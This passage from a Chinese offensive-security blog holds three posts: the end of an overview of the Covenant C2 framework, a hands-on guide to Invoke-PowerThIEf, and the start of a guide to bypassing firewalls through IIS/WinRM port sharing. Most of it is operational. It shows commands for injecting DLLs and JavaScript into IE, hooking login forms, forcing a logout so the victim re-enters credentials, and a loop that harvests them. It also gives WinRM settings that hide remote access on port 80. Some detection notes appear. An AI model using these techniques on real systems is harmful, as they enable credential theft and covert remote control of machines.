<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wscript file.js
</code></pre></div></div>

<p>这里借助了DotNetToJScript，其他内容同上</p>

<p>以上9种启动方式都可选择以下两个模板：</p>

<h4 id="1grunthttp">(1)GruntHTTP</h4>

<p>使用HTTP协议同C2 server进行通信</p>

<p>执行后反弹连接至C2 server</p>

<p>可设置以下参数：</p>

<ul>
  <li>ValidateCert</li>
  <li>UseCertPinning</li>
  <li>Delay</li>
  <li>JitterPercent</li>
  <li>ConnectAttempts</li>
  <li>KillDate</li>
  <li>DotNetFrameworkVersion</li>
</ul>

<h4 id="2gruntsmb">(2)GruntSMB</h4>

<p>使用命名管道，不直接同C2 server进行通信，而是在各个Grunts之间进行通信</p>

<p>执行后在本机创建命名管道，可通过其他的Grunt进行远程连接</p>

<p>这里多了一个配置参数：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SMBPipeName
</code></pre></div></div>

<p>使用示例：</p>

<p>GruntSMB为内网使用，可通过其他的Grunt进行激活，激活方式：</p>

<p><code class="language-plaintext highlighter-rouge">Grunt:&lt;id&gt;</code>-&gt;<code class="language-plaintext highlighter-rouge">Task</code>-&gt;<code class="language-plaintext highlighter-rouge">Connect</code></p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-11-1/2-3.png" alt="Alt text"></p>

<h3 id="3grunts">3.Grunts</h3>

<p>所有Grunts的列表，可向Grunt发送控制命令</p>

<h4 id="1info">(1)Info</h4>

<p>包括Grunt的基本信息</p>

<h4 id="2interact">(2)Interact</h4>

<p>命令行的控制页面</p>

<h4 id="3task">(3)Task</h4>

<p>Grunt支持的功能，内置了多个开源工具：</p>

<ul>
  <li><a href="https://github.com/GhostPack/Rubeus">Rubeus</a></li>
  <li><a href="https://github.com/GhostPack/Seatbelt">Seatbelt</a></li>
  <li><a href="https://github.com/GhostPack/SharpDPAPI">SharpDPAPI</a></li>
  <li><a href="https://github.com/GhostPack/SharpDump">SharpDump</a></li>
  <li><a href="https://github.com/cobbr/SharpSploit">SharpSploit</a></li>
  <li><a href="https://github.com/GhostPack/SharpUp">SharpUp</a></li>
  <li><a href="https://github.com/GhostPack/SharpWMI">SharpWMI</a></li>
</ul>

<h4 id="4taskings">(4)Taskings</h4>

<p>记录每条命令的执行情况</p>

<h3 id="4templates">4.Templates</h3>

<p>Grunt的模板文件，默认包含了GruntHTTP和GruntSMB</p>

<p>这里可以修改模板文件或者添加新的模板文件</p>

<h3 id="5tasks">5.Tasks</h3>

<p>Task的模板文件，作为Grunt支持的功能，内置了多个开源工具：</p>

<ul>
  <li><a href="https://github.com/GhostPack/Rubeus">Rubeus</a></li>
  <li><a href="https://github.com/GhostPack/Seatbelt">Seatbelt</a></li>
  <li><a href="https://github.com/GhostPack/SharpDPAPI">SharpDPAPI</a></li>
  <li><a href="https://github.com/GhostPack/SharpDump">SharpDump</a></li>
  <li><a href="https://github.com/cobbr/SharpSploit">SharpSploit</a></li>
  <li><a href="https://github.com/GhostPack/SharpUp">SharpUp</a></li>
  <li><a href="https://github.com/GhostPack/SharpWMI">SharpWMI</a></li>
</ul>

<p>这里可以修改模板文件或者添加新的模板文件</p>

<h3 id="6taskings">6.Taskings</h3>

<p>记录所有Grunts的命令执行情况</p>

<h3 id="7graph">7.Graph</h3>

<p>图形化页面，展示Grunt和Listener的连接关系</p>

<h3 id="8data">8.Data</h3>

<p>展示从Grunt获得的有价值信息</p>

<h3 id="9users">9.Users</h3>

<p>管理登录用户，用作团队协作</p>

<h2 id="0x04-covenant的优点">0x04 Covenant的优点</h2>
<hr>

<h3 id="1c2-server支持多平台">1.C2 Server支持多平台</h3>

<p>C2 Server不仅支持Linux，MacOS和Windows，还支持docker容器</p>

<h3 id="2扩展性高">2.扩展性高</h3>

<p>可自定义通信协议，自定义启动方式，自定义功能等</p>

<h3 id="3扩展的功能可直接在内存执行">3.扩展的功能可直接在内存执行</h3>

<p>通过动态编译，C2 Server能够对代码进行动态编译后发送至目标并使用Assembly.Load()从内存进行加载</p>

<h3 id="4支持内网通信统一流量出口">4.支持内网通信，统一流量出口</h3>

<p>在内网各个被控制端之间通过命名管道进行通信，统一流量出口，隐藏通信通道</p>

<h3 id="5便于团队协作">5.便于团队协作</h3>

<p>支持多用户，能够共享资源</p>

<h2 id="0x05-covenant的检测">0x05 Covenant的检测</h2>
<hr>

<h3 id="1检测net程序集的运行">1.检测.NET程序集的运行</h3>

<p>因为需要使用Rosyln C＃编译器，所以会引用Microsoft.CodeAnalysis程序集</p>

<p>这里可以尝试从指定进程中收集.NET事件，参考脚本：</p>

<p>https://gist.github.com/cobbr/1bab9e175ebbc6ff93cc5875c69ecc50</p>

<h3 id="2检测命名管道的使用">2.检测命名管道的使用</h3>

<p>检测命令管道远程连接的流量</p>

<p>命令管道远程连接会产生Event ID 18的日志，参考地址：</p>

<p>https://github.com/hunters-forge/OSSEM/blob/master/data_dictionaries/windows/sysmon/event-18.md</p>

<h3 id="3http通信流量">3.HTTP通信流量</h3>

<p>默认的通信模板存在特征，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-11-1/3-1.png" alt="Alt text"></p>

<h2 id="0x06-小结">0x06 小结</h2>
<hr>

<p>本文介绍了Covenant的细节，分析特点，Covenant的可扩展性很高，能够很方便的做二次开发。</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on November  1, 2019
  </div>

  
</article><article class="post">
  <h1>Invoke-PowerThIEf利用分析</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>Invoke-PowerThIEf是一个开源的Powershell脚本，不仅能够用来对IE浏览器窗口的内容进行操作，还能通过Hook的方法捕获IE浏览器的凭据。</p>

<p>地址如下：</p>

<p>https://github.com/nettitude/Invoke-PowerThIEf</p>

<p>本文将要对Invoke-PowerThIEf的功能进行测试，分享在Win7 sp1 x64下的使用方法，结合自己的经验，分析利用思路。</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将要介绍以下内容：</p>

<ul>
  <li>功能测试</li>
  <li>Win7Sp1下的使用方法</li>
  <li>利用分析</li>
</ul>

<h2 id="0x02-功能测试">0x02 功能测试</h2>
<hr>

<p>Invoke-PowerThIEf需要的环境配置如下：</p>

<ul>
  <li>IE 11</li>
  <li>Win 7-10</li>
  <li>.Net 4.0+</li>
  <li>Powershell 4.0</li>
</ul>

<p>考虑到以下原因：</p>

<ul>
  <li>Window7或Windows Server 2008，默认安装PowerShell 2.0</li>
  <li>Windows8或Windows server 2012，默认安装PowerShell 3.0</li>
  <li>Windows 8.1或Windows server 2012 R2，默认安装PowerShell 4.0</li>
</ul>

<p>首先选择Windows server 2012 R2 x64作为测试环境，可直接运行</p>

<p>常用功能如下：</p>

<h4 id="1列出ie浏览器的所有页面">(1)列出IE浏览器的所有页面</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-PowerThIEf -action ListUrls
</code></pre></div></div>

<h4 id="2在ie进程中加载dll">(2)在IE进程中加载dll</h4>

<p>示例如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-PowerThIEf -action ExecPayload -PathPayload calc_x64.dll
</code></pre></div></div>

<p>默认会在所有页面中执行加载dll的操作，并且会新建新的页面</p>

<p>例如：</p>

<p>如果当前IE进程有3个页面，执行该操作后会执行3次加载dll的操作，并且会在IE浏览器中新建3个页面</p>

<p>个人认为该功能的效果有限</p>

<h4 id="3向ie页面中插入javascript代码并执行">(3)向IE页面中插入JavaScript代码并执行</h4>

<p>针对所有页面：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-PowerThIEf -action InvokeJS -Script &lt;JavaScript to run&gt;
</code></pre></div></div>

<p>针对指定页面：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-PowerThIEf -action InvokeJS -BrowserIndex &lt;BrowserIndex&gt; -Script &lt;JavaScript to run&gt;
</code></pre></div></div>

<p><strong>注：</strong></p>

<p><code class="language-plaintext highlighter-rouge">&lt;BrowserIndex&gt;</code>可通过ListUrls命令获得</p>

<p>示例如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-PowerThIEf -action InvokeJS -Script 'alert(document.location.href);'

Invoke-PowerThIEf -action InvokeJS -BrowserIndex 132572 -Script "alert(`"1`");"
</code></pre></div></div>

<h4 id="4dump页面内容">(4)Dump页面内容</h4>

<p>针对所有页面：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-PowerThIEf -action DumpHTML
</code></pre></div></div>

<p>针对指定页面：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-PowerThIEf -action DumpHTML -BrowserIndex &lt;BrowserIndex&gt;
</code></pre></div></div>

<p>针对指定页面的指定元素：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-PowerThIEf -action DumpHTML -BrowserIndex &lt;BrowserIndex&gt; -SelectorType tag -Selector &lt;type&gt;

Invoke-PowerThIEf -action DumpHTML -BrowserIndex &lt;BrowserIndex&gt; -SelectorType id -Selector &lt;id&gt;

Invoke-PowerThIEf -action DumpHTML -BrowserIndex &lt;BrowserIndex&gt; -SelectorType name -Selector &lt;name&gt;
</code></pre></div></div>

<h4 id="5隐藏和显示页面">(5)隐藏和显示页面</h4>

<p>隐藏所有页面：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-PowerThIEf -action HideWindow
</code></pre></div></div>

<p>隐藏指定页面：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-PowerThIEf -action HideWindow -BrowserIndex &lt;BrowserIndex&gt;
</code></pre></div></div>

<p>显示所有页面：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-PowerThIEf -action ShowWindow
</code></pre></div></div>

<p>显示指定页面：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-PowerThIEf -action ShowWindow -BrowserIndex &lt;BrowserIndex&gt;
</code></pre></div></div>

<p>这里会对页面所在的进程iexploer.exe进行隐藏和显示</p>

<p>例如：</p>

<p>如果进程iexploer1.exe下有两个页面A和B，进程iexploer2.exe下有两个页面C和D，如果隐藏页面A，那么会隐藏进程iexploer1.exe下的所有页面A和B，而iexploer2.exe下有的两个页面C和D不受影响</p>

<h4 id="6页面重定向">(6)页面重定向</h4>

<p>控制页面访问指定的URL</p>

<p>针对所有页面：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-PowerThIEf -action Navigate -NavigateUrl &lt;URL&gt;
</code></pre></div></div>

<p>针对指定页面：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-PowerThIEf -action Navigate -BrowserIndex &lt;BrowserIndex&gt; -NavigateUrl &lt;URL&gt;
</code></pre></div></div>

<h4 id="7捕获凭据">(7)捕获凭据</h4>

<p>这里分为两个步骤：</p>

<p>1.命令执行后，将会Hook所有新打开的页面并记录凭据</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-PowerThIEf -action HookLoginForms 
</code></pre></div></div>

<p>2.查看已捕获的凭据</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-PowerThIEf -action Creds
</code></pre></div></div>

<h4 id="8新建页面">(8)新建页面</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-PowerThIEf -action NewBackgroundTab
</code></pre></div></div>

<h2 id="0x03-win7sp1下的使用方法">0x03 Win7Sp1下的使用方法</h2>
<hr>

<p>这里使用的测试系统为Win7Sp1 x64</p>

<p>Invoke-PowerThIEf直接在Win7sp1下使用会报错，提示如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Unable to find type [System.__ComObject]: make sure that the assembly containin
g this type is loaded.
At C:\test\Invoke-PowerThIEf.ps1:151 char:41
+         [OutputType([System.__ComObject] &lt;&lt;&lt;&lt; )]
    + CategoryInfo          : InvalidOperation: (System.__ComObject:String) []
   , ParentContainsErrorRecordException
    + FullyQualifiedErrorId : TypeNotFound
</code></pre></div></div>

<p>这里需要安装Microsoft .NET Framework 4.5和Windows Management Framework 4.0</p>

<h3 id="1安装microsoft-net-framework-45">1.安装Microsoft .NET Framework 4.5</h3>

<p>命令行下的安装方法可参考之前的文章<a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80%E2%80%94%E2%80%94%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%B8%8B%E5%AE%89%E8%A3%85Microsoft_.NET_Framework/">《渗透基础——命令行下安装Microsoft .NET Framework》</a></p>

<p>实现自动安装的代码可参考：</p>

<p>https://github.com/3gstudent/Homework-of-C-Language/blob/master/Install_.Net_Framework_from_the_command_line.cpp</p>

<p>安装后需要等待系统重新启动才能生效</p>

<h3 id="2安装windows-management-framework-40">2.安装Windows Management Framework 4.0</h3>

<p>下载地址：</p>

<p>https://www.microsoft.com/en-us/download/details.aspx?id=40855</p>

<p>命令行下的安装命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wusa.exe Windows6.1-KB2819745-x64-MultiPkg.msu /quiet /norestart
</code></pre></div></div>

<p>安装成功后进程wusa.exe将会自动退出</p>

<p>同样需要等待系统重启启动才能生效</p>

<p>再次执行Invoke-PowerThIEf</p>

<p>报错提示如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Add-Type : Could not load file or assembly 'Microsoft.mshtml,
Version=7.0.3300.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a' or one
of its dependencies. The system cannot find the file specified.
At C:\test\Invoke-PowerThIEf.ps1:362 char:13
+             Add-Type -TypeDefinition $source -Language CSharp
-ReferencedAssembl ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
~~~
    + CategoryInfo          : NotSpecified: (:) [Add-Type], FileNotFoundExcept
   ion
    + FullyQualifiedErrorId : System.IO.FileNotFoundException,Microsoft.PowerS
   hell.Commands.AddTypeCommand
</code></pre></div></div>

<p>错误的原因是代码中使用了：<code class="language-plaintext highlighter-rouge">using mshtml;</code> ，缺少这个引用文件</p>

<p>Invoke-PowerThIEf在Server2012R2下能够正常使用，于是我尝试比较Server2012R2和Win7系统的差异，看看能否通过替换文件的方式解决这个问题</p>

<h3 id="解决方法1">解决方法1</h3>

<p>参考资料：</p>

<p>https://www.crifan.com/microsoft_html_object_library_mshtml_tlb_in_com_vs_microsoft_mshtml_microsoft_mshtml_dll_in_dotnet/</p>

<p>在安装VS2015的Server2012R2下尝试导出mshtml.dll，命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Program Files (x86)\Microsoft SDKs\Windows\v7.0A\Bin\x64\tlbimp.exe C:\Windows\System32\mshtml.tlb /out:c:\test\mshtml.dll
</code></pre></div></div>

<p>获得mshtml.dll</p>

<p>将mshtml.dll放在Invoke-PowerThIEf的同级目录下，重命名为Microsoft.mshtml.dll</p>

<p>执行后依旧是同样的错误，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-11-11/2-1.png" alt="Alt text"></p>

<p>该方法失败</p>

<h3 id="解决方法2">解决方法2</h3>

<p>经过对比，发现Server2012R2比Win7系统多了文件夹：<code class="language-plaintext highlighter-rouge">C:\Windows\assembly\GAC\Microsoft.mshtml</code></p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-11-11/2-2.png" alt="Alt text"></p>

<p>具体多出以下文件：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Windows\assembly\GAC&gt;tree Microsoft.mshtml /f
Folder PATH listing
Volume serial number is F4B2-E12B
C:\WINDOWS\ASSEMBLY\GAC\MICROSOFT.MSHTML
└───7.0.3300.0__b03f5f7f11d50a3a
        Microsoft.mshtml.dll
        __AssemblyInfo__.ini
</code></pre></div></div>

<p><strong>注：</strong></p>

<p>C:\Windows\assembly下文件夹的具体内容只能通过命令行进行查看，无法在Explorer中查看</p>

<p>于是尝试将Server2012R2系统中C:\Windows\assembly\GAC\Microsoft.mshtml的所有内容复制到Win7下面</p>

<p>我已经将C:\Windows\assembly\GAC\Microsoft.mshtml的所有内容提取出来并上传至github，地址如下：</p>

<p>https://github.com/3gstudent/Invoke-PowerThIEf/tree/master/Microsoft.mshtml</p>

<p>在Win7系统的命令行下执行：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>xcopy Microsoft.mshtml C:\Windows\assembly\GAC\Microsoft.mshtml /i /s /e
</code></pre></div></div>

<p>再次执行Invoke-PowerThIEf，运行成功，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-11-11/2-3.png" alt="Alt text"></p>

<h2 id="0x04-利用分析">0x04 利用分析</h2>
<hr>

<p>Invoke-PowerThIEf的利用场景主要有以下3个：</p>

<h3 id="1控制ie浏览器访问指定页面并获得网页内容">1.控制IE浏览器访问指定页面并获得网页内容</h3>

<h4 id="1创建一个新页面">(1)创建一个新页面</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-PowerThIEf -action NewBackgroundTab
</code></pre></div></div>

<h4 id="2获得新页面的序号">(2)获得新页面的序号</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-PowerThIEf -action ListUrls
</code></pre></div></div>

<p>假设这里的序号为132572</p>

<h4 id="3将其重定向到指定url">(3)将其重定向到指定URL</h4>

<p>这里以<code class="language-plaintext highlighter-rouge">https://www.shodan.io/</code>为例</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-PowerThIEf -action Navigate -BrowserIndex 132572 -NavigateUrl https://www.shodan.io/
</code></pre></div></div>

<h4 id="4抓取页面结果">(4)抓取页面结果</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-PowerThIEf -action DumpHTML -BrowserIndex 132572
</code></pre></div></div>

<h4 id="5关闭此页面">(5)关闭此页面</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-PowerThIEf -action InvokeJS -BrowserIndex 132572 -Script "window.opener=null;window.open('','_self');window.close();"
</code></pre></div></div>

<h4 id="补充重定向到空白页面">补充：重定向到空白页面</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-PowerThIEf -action Navigate -BrowserIndex 132572 -NavigateUrl about:blank
</code></pre></div></div>

<h3 id="2抓取凭据">2.抓取凭据</h3>

<h4 id="1列出所有标签">(1)列出所有标签</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-PowerThIEf -action ListUrls
</code></pre></div></div>

<p>发现后台有shodan的登录页面</p>

<h4 id="2开启抓取凭据的功能">(2)开启抓取凭据的功能</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-PowerThIEf -action HookLoginForms
</code></pre></div></div>

<h4 id="3强制shodan账号退出登录状态">(3)强制shodan账号退出登录状态</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-PowerThIEf -action InvokeJS -BrowserIndex 525660 -Script "window.location.href = 'https://account.shodan.io/logout';"
</code></pre></div></div>

<p>等待用户重新登录</p>

<h4 id="4查看抓取到的凭据">(4)查看抓取到的凭据</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-PowerThIEf -action Creds 
</code></pre></div></div>

<p>这里需要注意，执行完步骤2后不能退出Powershell进程，否则无法抓取到新的凭据</p>

<p>如果想要自动实现以上功能，这里可以通过加循环的方法实现每隔10秒在后台抓取凭据，使用的Powershell命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-PowerThIEf -action HookLoginForms
while(1)
{
    Start-Sleep –s 10
    Write-host "[*] Sleep 10 seconds"
    Invoke-PowerThIEf -action Creds
}
</code></pre></div></div>

<p>执行脚本：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>powershell -ep bypass -f Invoke-PowerThIEf.ps1
</code></pre></div></div>

<h3 id="3修改页面内容执行javascript代码">3.修改页面内容，执行JavaScript代码</h3>

<p>针对所有页面：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-PowerThIEf -action InvokeJS -Script &lt;JavaScript to run&gt;
</code></pre></div></div>

<p>针对指定页面：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-PowerThIEf -action InvokeJS -BrowserIndex &lt;BrowserIndex&gt; -Script &lt;JavaScript to run&gt;
</code></pre></div></div>

<p>要实现的功能取决于具体的JavaScript代码</p>

<h2 id="0x05-小结">0x05 小结</h2>
<hr>

<p>本文介绍了Invoke-PowerThIEf支持的功能，分享在Win7 sp1 x64下的使用方法，结合自己的经验，分析利用思路。</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on November 11, 2019
  </div>

  
</article><article class="post">
  <h1>利用IIS的端口共享功能绕过防火墙</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>我最近在思考这样一个问题：</p>

<p>Windows服务器开启了IIS服务，防火墙仅允许80或443端口进行通信，那么如何在不使用webshell的前提下，实现对该服务器的远程管理？更进一步，如果只有低权限，有没有办法呢？</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将要介绍以下内容：</p>

<ul>
  <li>HTTP.sys和端口共享</li>
  <li>WinRM服务</li>
  <li>HTTP Server API</li>
  <li>针对80和443端口的利用方法</li>
  <li>针对高权限和低权限的利用方法</li>
  <li>检测方法</li>
</ul>

<h2 id="0x02-基本概念">0x02 基本概念</h2>
<hr>

<h3 id="1httpsys和端口共享">1.HTTP.sys和端口共享</h3>

<p>微软在Windows 2003 Server加入了内核驱动程序(Http.sys)，用于侦听http流量并根据URL进行处理，允许任意用户进程共享专用于HTTP流量的TCP端口</p>

<p>也就是说，通过HTTP.sys，多个进程将能够侦听同一端口上的HTTP流量</p>

<p>可以使用Netsh命令来查询和配置HTTP.sys设置和参数，参考资料如下：</p>

<p>https://docs.microsoft.com/en-us/windows/win32/http/netsh-commands-for-http</p>

<p>列出所有URL的DACL，命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>netsh http show urlacl
</code></pre></div></div>

<p>系统默认包括10个DACL，其中的两个对应WinRM服务，具体信息如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    Reserved URL            : http://+:5985/wsman/
        User: NT SERVICE\WinRM
            Listen: Yes
            Delegate: No
        User: NT SERVICE\Wecsvc
            Listen: Yes
            Delegate: No
            SDDL: D:(A;;GX;;;S-1-5-80-569256582-2953403351-2909559716-1301513147
-412116970)(A;;GX;;;S-1-5-80-4059739203-877974739-1245631912-527174227-299656351
7)

    Reserved URL            : https://+:5986/wsman/
        User: NT SERVICE\WinRM
            Listen: Yes
            Delegate: No
        User: NT SERVICE\Wecsvc
            Listen: Yes
            Delegate: No
            SDDL: D:(A;;GX;;;S-1-5-80-569256582-2953403351-2909559716-1301513147
-412116970)(A;;GX;;;S-1-5-80-4059739203-877974739-1245631912-527174227-299656351
7)
</code></pre></div></div>

<p>5985对应http的端口，5986对应https的端口</p>

<h3 id="2winrm服务">2.WinRM服务</h3>

<p>学习资料：</p>

<p>https://docs.microsoft.com/en-us/windows/win32/winrm/portal</p>

<p>全称Windows Remote Management，能够实现在远程主机上执行命令</p>

<h3 id="3http-server-api">3.HTTP Server API</h3>

<p>学习资料：</p>

<p>https://docs.microsoft.com/en-us/windows/win32/http/http-api-start-page</p>

<p>HTTP Server API使应用程序能够接收定向到URL的HTTP请求并发送HTTP响应</p>

<h2 id="0x03-利用winrm服务实现端口复用">0x03 利用WinRM服务实现端口复用</h2>
<hr>

<p><strong>注：</strong></p>

<p>Twi1ight的文章已经介绍了这部分内容，感谢他的分享，地址如下：</p>

<p>https://paper.seebug.org/1004/</p>

<p>本节仅对此文章中的内容进行归纳整理并稍作补充</p>

<p>Windows Server 2008默认关闭WinRM服务，Windows Server 2012默认开启</p>

<p><strong>注：</strong></p>

<p>以下操作需要获得管理员权限</p>

<h3 id="1如果系统已开启winrm服务">1.如果系统已开启WinRM服务</h3>

<h4 id="1查看监听配置">(1)查看监听配置</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>winrm e winrm/config/listener
</code></pre></div></div>

<p>默认监听5985端口，为了不修改默认配置，这里需要新增80端口</p>

<p><strong>注：</strong></p>

<p>查看WinRM配置的命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>winrm get winrm/config
</code></pre></div></div>

<h4 id="2新增80端口">(2)新增80端口</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>winrm set winrm/config/service @{EnableCompatibilityHttpListener="true"}
</code></pre></div></div>

<p>补充：</p>

<p>删除80端口的命令如下:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>winrm set winrm/config/service @{EnableCompatibilityHttpListener="false"}
</code></pre></div></div>

<p><strong>注：</strong></p>

<p>如果未新增80端口，远程连接需要指定5985端口，示例如下:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>winrs -r:http://192.168.112.129:5985 -u:test -p:1234 "whoami"
</code></pre></div></div>

<h4 id="3允许administrators组中的所有帐户访问该服务">(3)允许Administrators组中的所有帐户访问该服务</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
</code></pre></div></div>

<p><strong>注：</strong></p>

<p>如果不设置此项，远程连接时只能使用内置管理员帐户Administrator</p>

<h3 id="2如果系统未开启winrm服务">2.如果系统未开启WinRM服务</h3>

<h4 id="1使用默认配置开启并配置服务">(1)使用默认配置开启并配置服务</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Winrm quickconfig -q
</code></pre></div></div>

<p>将自动执行以下操作：</p>

<ul>
  <li>启动WinRM服务，并将服务启动类型设置为自动启动</li>
  <li>添加监听配置</li>
  <li>添加防火墙规则</li>
</ul>

<h4 id="2修改默认端口">(2)修改默认端口</h4>

<p>开启服务后，默认监听5985端口，为了更隐蔽，这里需要将默认端口5985修改为80端口</p>

<p>修改http默认端口为80：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>winrm set winrm/config/Listener?Address=*+Transport=HTTP @{Port="80"}
</code></pre></div></div>

<p><strong>注：</strong></p>

<p>还原http默认端口为5985的命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>winrm set winrm/config/Listener?Address=*+Transport=HTTP @{Port="5985"}
</code></pre></div></div>

<h4 id="3允许administrators组中的所有帐户访问该服务-1">(3)允许Administrators组中的所有帐户访问该服务</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
</code></pre></div></div>

<p><strong>注：</strong></p>

<p>如果不设置此项，远程连接时只能使用内置管理员帐户Administrator</p>

<h3 id="3通过winrm服务连接远程主机">3.通过WinRM服务连接远程主机</h3>

<p>本地系统需要使用同远程主机相同的语言环境</p>

<h4 id="1本地系统开启winrm服务">(1)本地系统开启WinRM服务</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Winrm quickconfig -q
</code></pre></div></div>

<h4 id="2本地系统设置访问规则允许连接所有主机">(2)本地系统设置访问规则，允许连接所有主机</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>winrm set winrm/config/Client @{TrustedHosts="*"}
</code></pre></div></div>

<p><strong>注：</strong></p>

<p>删除该访问规则的命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>winrm set winrm/config/Client @{TrustedHosts=""}
</code></pre></div></div>

<h4 id="3连接远程主机的命令示例">(3)连接远程主机的命令示例</h4>

<p>如果为默认5985端口，命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>winrs -r:http://192.168.112.129:5985 -u:administrator -p:1234 "whoami"
</code></pre></div></div>

<p>如果为80端口，命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>winrs -r:http://192.168.112.129 -u:administrator -p:1234 "whoami"
</code></pre></div></div>

<h2 id="0x04-利用http-server-api实现端口复用">0x04 利用HTTP Server API实现端口复用</h2>
<hr>

